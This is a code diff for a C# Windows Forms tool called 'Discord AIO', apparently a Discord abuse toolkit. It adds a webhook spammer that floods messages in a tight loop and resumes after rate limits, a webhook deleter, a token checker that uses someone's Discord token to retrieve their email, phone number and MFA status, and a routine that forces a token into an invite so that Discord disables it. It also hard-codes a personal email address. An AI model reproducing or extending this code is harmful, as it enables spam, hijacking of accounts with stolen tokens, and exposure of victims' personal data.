@@ -1,9 +1,11 @@
 ﻿using DiscordRPC;
+using Leaf.xNet;
 using ScintillaNET;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
+using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Drawing2D;
 using System.IO;
@@ -11,6 +13,7 @@ using System.Linq;
 using System.Net;
 using System.Security.Cryptography;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -18,18 +21,6 @@ namespace discordAIO
 {
     public partial class main : Form
     {
-        private string logo = @"
-██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗      █████╗ ██╗ ██████╗ 
-██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ██╔══██╗██║██╔═══██╗
-██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ███████║██║██║   ██║
-██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ██╔══██║██║██║   ██║
-██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝    ██║  ██║██║╚██████╔╝
-╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═╝  ╚═╝╚═╝ ╚═════╝ 
-                                                                            
-                                                                            
-
-";
-
 
         private string version = "v1.0";
         private protected string email = "fmediolanek@gmail.com";
@@ -42,10 +33,9 @@ namespace discordAIO
             InitializeComponent();
             mainPage.Visible = true;
             webhooksPage.Visible = false;
+            tokensPage.Visible = false;
+            builderPage.Visible = false;
 
-
-            richTextBox1.Font = new Font(FontFamily.GenericMonospace, richTextBox1.Font.Size);
-            richTextBox1.Text = logo;
 
             CheckProtection();
 
@@ -95,7 +85,7 @@ namespace discordAIO
                 State = "github.com/Nyxonn",
                 Assets = new Assets()
                 {
-                    LargeImageKey = "aio3",
+                    LargeImageKey = "daiorpc2",
                     LargeImageText = "Discord AIO " + version
                 }
 
@@ -155,6 +145,8 @@ namespace discordAIO
         private void button1_Click(object sender, EventArgs e) // Main button
         {
             webhooksPage.Visible = false;
+            tokensPage.Visible = false;
+            builderPage.Visible = false;
             mainPage.Visible = true;
         }
 
@@ -162,6 +154,8 @@ namespace discordAIO
         {
             webhooksPage.Visible = true;
             mainPage.Visible = false;
+            tokensPage.Visible = false;
+            builderPage.Visible = false;
         }
 
 
@@ -280,6 +274,264 @@ namespace discordAIO
                     MessageBox.Show("Invalid webhook.", "Discord AIO");
                 }
             }
+        }
+
+        private void pictureBox1_Click(object sender, EventArgs e)
+        {
+            Process.Start("https://discord.gg/qjrDprutvg");
+        }
+
+        private void label4_Click(object sender, EventArgs e)
+        {
+            Process.Start("https://discord.gg/qjrDprutvg");
+        }
+
+        private void button6_Click(object sender, EventArgs e) // Perform Webhook Check Webhooks
+        {
+            if (String.IsNullOrEmpty(textBox1.Text) || String.IsNullOrWhiteSpace(textBox1.Text))
+            {
+                MessageBox.Show("Webhook cannot be empty!", "Discord AIO");
+            }
+            else
+            {
+                WebClient checkWebhook = new WebClient();
+                try
+                {
+                    string webhook = checkWebhook.DownloadString(textBox1.Text);
+                    MessageBox.Show("Webhook valid.", "Discord AIO");
+                }
+                catch
+                {
+                    MessageBox.Show("Invalid webhook.", "Discord AIO");
+                }
+            }
+        }
+
+        private bool webhookSwitch = false;
+        private bool webHandler = false;
+
+        private void button9_Click(object sender, EventArgs e)
+        {
+            if (String.IsNullOrEmpty(textBox1.Text) || String.IsNullOrWhiteSpace(textBox1.Text) || (String.IsNullOrEmpty(textBox3.Text) || String.IsNullOrWhiteSpace(textBox3.Text) || (String.IsNullOrEmpty(textBox4.Text) || String.IsNullOrWhiteSpace(textBox4.Text))))
+            {
+                MessageBox.Show("Webhook, name and message cannot be empty!", "Discord AIO");
+            }
+            else
+            {
+                string SPAMwebhook = textBox1.Text;
+                string SPAMname = textBox3.Text;
+                string SPAMmessage = textBox4.Text;
+
+                webhookSwitch = true;
+
+
+                if (checkBox17.Checked)
+                {
+                    new Thread(() =>
+                    {
+                        while (webhookSwitch)
+                        {
+                            try
+                            {
+                                using (HttpRequest req = new HttpRequest())
+                                {
+                                    string request = req.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"embeds\":[{\"title\":\"Discord AIO bitcheeeeesss!\",\"description\":\"" + SPAMmessage + "\",\"type\":\"rich\",\"color\":\"3330898\",\"footer\":{\"text\":\"Discord AIO\"},\"author\":{\"name\":\"Discord AIO\",\"icon_url\":\"https://i.imgur.com/BDfuGjz.jpg\",\"url\":\"https://discord.gg/YXa2BF8Q3H\"}}]}", "application/json").ToString();
+                                    Thread.Sleep(2000);
+                                }
+                            }
+                            catch
+                            {
+                                if (webHandler == false)
+                                {
+                                    webhookSwitch = false;
+                                    MessageBox.Show("Too many requests.\nSpam delayed.", "Discord AIO");
+                                    Thread.Sleep(3000);
+                                    webhookSwitch = true;
+                                }
+                            }
+                        }
+                    }).Start();
+                }
+                else
+                {
+                    new Thread(() =>
+                    {
+                        while (webhookSwitch)
+                        {
+                            try
+                            {
+                                using (HttpRequest req = new HttpRequest())
+                                {
+                                    string request = req.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"embeds\":[{\"title\":\"Discord AIO bitcheeeeesss!\",\"description\":\"" + SPAMmessage + "\",\"type\":\"rich\",\"color\":\"3330898\",\"footer\":{\"text\":\"Discord AIO\"},\"author\":{\"name\":\"Discord AIO\",\"icon_url\":\"https://i.imgur.com/BDfuGjz.jpg\",\"url\":\"https://discord.gg/YXa2BF8Q3H\"}}]}", "application/json").ToString();
+                                    Thread.Sleep(35);
+                                }
+                            }
+                            catch
+                            {
+                                if (webHandler == false)
+                                {
+                                    webhookSwitch = false;
+                                    MessageBox.Show("Too many requests.\nSpam delayed.", "Discord AIO");
+                                    Thread.Sleep(500);
+                                    webhookSwitch = true;
+                                }
+                            }
+                        }
+                    }).Start();
+                }
+
+            }
+        }
+
+        private void button10_Click(object sender, EventArgs e)
+        {
+            webhookSwitch = false;
+            webHandler = true;
+            MessageBox.Show("Spam stopped.", "Discord AIO");
+        }
+
+        private void button8_Click(object sender, EventArgs e)
+        {
+            if (String.IsNullOrEmpty(textBox1.Text) || String.IsNullOrWhiteSpace(textBox1.Text))
+            {
+                MessageBox.Show("Webhook cannot be empty!", "Discord AIO");
+            }
+            else
+            {
+                try
+                {
+                    new HttpRequest().Delete(textBox1.Text).ToString();
+                    MessageBox.Show("Webhook deleted.", "Discord AIO");
+                }
+                catch
+                {
+                    MessageBox.Show("Invalid webhook.", "Discord AIO");
+                }
+            }
+        }
+
+        // Get between handler
+        public static string getBetween(string strSource, string strStart, string strEnd)
+        {
+            if (strSource.Contains(strStart) && strSource.Contains(strEnd))
+            {
+                int Start, End;
+                Start = strSource.IndexOf(strStart, 0) + strStart.Length;
+                End = strSource.IndexOf(strEnd, Start);
+                return strSource.Substring(Start, End - Start);
+            }
+
+            return "";
+        }
+
+        // Token checker
+        private void button11_Click(object sender, EventArgs e)
+        {
+            if (String.IsNullOrEmpty(textBox5.Text) || String.IsNullOrWhiteSpace(textBox5.Text))
+            {
+                MessageBox.Show("Token cannot be empty!", "Discord AIO");
+            } else
+            {
+                string token = textBox5.Text;
+
+                try
+                {
+
+                    HttpRequest req = new HttpRequest();
+                    req.AddHeader("Authorization", token);
+                    var tokenReq = req.Get("https://discordapp.com/api/users/@me");
+                    string tokenCreds = tokenReq.ToString();
+
+                    string nameData = getBetween(tokenCreds, "username\": ", ",");
+                    string nameDISData = getBetween(tokenCreds, "discriminator\": ", ",");
+                    string emailData = getBetween(tokenCreds, "email\": ", ",");
+                    string phoneData = getBetween(tokenCreds, "phone\": ", "}");
+                    string idData = getBetween(tokenCreds, "id\": ", ",");
+                    string mfaData = getBetween(tokenCreds, "mfa_enabled\": ", ",");
+                    string vData = getBetween(tokenCreds, "verified\": ", ",");
+                    string avatarData = getBetween(tokenCreds, "avatar\": ", ",");
+
+                    // Trims
+                    label18.Text = nameData.Trim('"') + " #" + nameDISData.Trim('"');
+                    label19.Text = emailData.Trim('"');
+                    label20.Text = phoneData.Trim('"');
+                    string trimedID = idData.Trim('"');
+                    string trimedMFA = mfaData.Trim('"');
+                    string trimedVRF = vData.Trim('"');
+                    string trimedAvatar = avatarData.Trim('"');
+                    label21.Text = trimedID;
+
+                    // MFA label
+                    string credMFA = "Disabled";
+                    if (trimedMFA == "true")
+                    {
+                        credMFA = "Enabled";
+                    }
+                    label22.Text = credMFA;
+
+                    // Verified label
+                    string credVRF = "Unverified";
+                    if (trimedVRF == "true")
+                    {
+                        credVRF = "Verified";
+                    }
+                    label23.Text = credVRF;
+
+                    // Avatar
+                    string link = "https://cdn.discordapp.com/avatars/" + trimedID + "/" + trimedAvatar + ".jpg";
+                    var request = WebRequest.Create(link);
+
+                    using (var response = request.GetResponse())
+                    using (var stream = response.GetResponseStream())
+                    {
+                        pictureBox2.Image = Bitmap.FromStream(stream);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.ToString());
+                    MessageBox.Show("Invalid token.", "Discord AIO");
+                }
+
+            }
+        }
+
+        private void button12_Click(object sender, EventArgs e)
+        {
+            string token = textBox5.Text;
+            if (String.IsNullOrEmpty(textBox5.Text) || String.IsNullOrWhiteSpace(textBox5.Text))
+            {
+                MessageBox.Show("Token cannot be empty!", "Discord AIO");
+            }
+            else
+            {
+                try
+                {
+                    HttpRequest req = new HttpRequest();
+                    req.AddHeader("Authorization", token);
+                    req.Post("https://discordapp.com/api/v6/invite/minecraft");
+                }
+                catch
+                {
+                    MessageBox.Show("Token deleted.", "Discord AIO");
+                }
+            }
+        }
+
+        private void button5_Click(object sender, EventArgs e)
+        {
+            tokensPage.Visible = true;
+            webhooksPage.Visible = false;
+            mainPage.Visible = false;
+            builderPage.Visible = false;
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            builderPage.Visible = true;
+            tokensPage.Visible = false;
+            webhooksPage.Visible = false;
+            mainPage.Visible = false;
         }
     }
 }
